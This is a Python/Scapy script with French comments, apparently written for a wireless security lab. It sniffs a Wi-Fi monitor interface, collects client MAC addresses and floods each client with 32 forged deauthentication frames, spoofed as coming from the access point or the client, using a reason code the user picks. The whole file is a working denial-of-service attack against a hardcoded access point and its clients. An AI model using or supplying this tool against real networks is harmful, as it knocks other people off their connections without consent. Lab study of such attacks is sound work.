#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors : yimnaing Kamdem && Siu Aurelien
#  Objectif: Développer un script en Python/Scapy capable de générer et envoyer des trames de
#            déauthentification. Le script donne le choix entre des Reason codes différents déduit
#			 si le message doit être envoyé à la STA ou à l'AP

#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


interface = "wlan0mon"
# Spécifier l'adresse MAC du point d'accès utilisé pour la déauthentification
accessPointBSSID = "7c:95:f3:00:79:d0" 
# Liste des clients
clientsBSSID = []
pkt = ""
 
# fonction appelée pour chaque paquet sniffé
def sniffing(packetToSniff):

    # on enregistre  l'adresse mac source si elle n'est pas encore present dans la liste        
    if packetToSniff.addr1 not in clientsBSSID :
        clientsBSSID.append(packetToSniff.addr1)

# Récupération de la raison de déauthentification souhaitée par l'utilisateur.
reasonNumber = int(input('Choisissez une raison de déauthentification : \n \
1 - Unspecified\n \
4 - Disassociated due to inactivity\n \
5 - Disassociated because AP is unable to handle all currently associated stations\n \
8 - Deauthenticated because sending STA is leaving BSS\n\n \
Reason: '))

# On sniffe en passant en fonction de callback la fonction sniffing
sniff(count=400, iface=interface, prn=sniffing)

for x in clientsBSSID :
    # Envoi de la trame au client
    if(reasonNumber == 1 or reasonNumber == 4 or reasonNumber == 5): # Raisons pour laquelle il faut envoyer les trames à L'AP
        pkt = RadioTap() / Dot11(addr1=x, addr2=accessPointBSSID, addr3=accessPointBSSID) / Dot11Deauth(reason=reasonNumber)
    # Envoi de la trame au point d'accès
    elif (reasonNumber == 8):  # Raison pour laquelle il faut envoyer les trames au client
        pkt = RadioTap() / Dot11(addr1=accessPointBSSID, addr2=x, addr3=x) / Dot11Deauth(reason=reasonNumber)
    else:
        break;
    # Envoi de 32 paquets pour chaque client, ce chiffre peut être modifié
    for y in range(32):    
        sendp(pkt, iface=interface)
    
